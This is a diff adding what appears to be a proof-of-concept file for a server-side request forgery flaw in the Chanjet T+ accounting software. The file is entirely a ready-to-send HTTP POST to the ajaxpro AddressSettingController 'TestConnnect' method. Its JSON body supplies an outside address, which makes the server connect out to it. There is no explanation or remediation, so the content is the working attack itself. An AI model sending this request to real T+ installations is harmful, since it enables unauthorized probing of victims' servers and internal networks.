@@ -1,0 +1,16 @@
+# 畅捷通 T+ AddressSettingController SSRF漏洞
+POST /tplus/ajaxpro/Ufida.T.SM.UIP.UA.AddressSettingController,Ufida.T.SM.UIP.ashx?_ZQA_ID=8d6d94f925768951&method=TestConnnect HTTP/1.1
+Host: www.byp-test.com:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate, zstd
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Connection: keep-alive
+Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8
+Cache-Control: no-cache
+Content-Type: application/json
+Pragma: no-cache
+Content-Length: 34
+
+{
+  "address":"r.zhiqian.info"
+}
